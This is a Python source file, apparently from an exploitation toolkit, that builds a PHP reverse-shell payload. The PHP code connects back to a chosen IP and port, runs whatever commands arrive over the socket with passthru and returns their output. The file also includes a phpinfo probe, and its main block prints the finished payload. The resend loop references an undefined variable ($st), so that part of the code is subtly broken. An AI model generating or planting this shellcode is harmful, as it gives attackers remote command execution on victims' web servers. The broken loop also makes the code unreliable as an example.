from .base import ShellCode


class PhpShellCode(ShellCode):
    """
        Class with shellcode for php language
    """

    def __init__(self, connect_back_ip='localhost', connect_back_port=5555, prefix='<?php', suffix='?>'):
        ShellCode.__init__(self, connect_back_ip=connect_back_ip,
                           connect_back_port=connect_back_port,
                           prefix=prefix,
                           suffix=suffix)

    def get_phpinfo(self):
        """ Function to get phpinfo """
        phpcode = "<?php phpinfo(); ?>"
        return phpcode

    def get_phpcode(self):
        """ Function to get php shellcode """

        if not self.connect_back_ip or not self.connect_back_port:
            print("Settings for connect back listener must be defined")
            return False

        phpcode = """
        $address="{{LOCALHOST}}";
        $port={{LOCALPORT}};
        $buff_size=2048;
        $timeout=120;
        $sock=fsockopen($address,$port) or die("Cannot create a socket");
        while ($read=fgets($sock,$buff_size)) {
            $out="";
            if ($read) {
                if (strcmp($read,"quit")===0 || strcmp($read,"q")===0) {
                    break;
                }
                ob_start();
                passthru($read);
                $out=ob_get_contents();
                ob_end_clean();
            }
            $length=strlen($out);
            while (1) {
                $sent=fwrite($sock,$out,$length);
                if ($sent===false) {
                    break;
                }
                if ($sent<$length) {
                    $st=substr($st,$sent);
                    $length-=$sent;
                } else {
                    break;
                }
            }
        }
        fclose($sock);
        """
        phpcode = self.format_shellcode(phpcode)
        phpcode = "{prefix}{code}{suffix}".format(prefix=self.prefix, code=phpcode, suffix=self.suffix)
        return phpcode

    def get_shellcode(self, inline=False):
        shell = self.get_phpcode()
        if inline:
            shell = self.make_inline(shell)
        return shell


if __name__ == '__main__':
    p = PhpShellCode()
    print(p.get_shellcode())
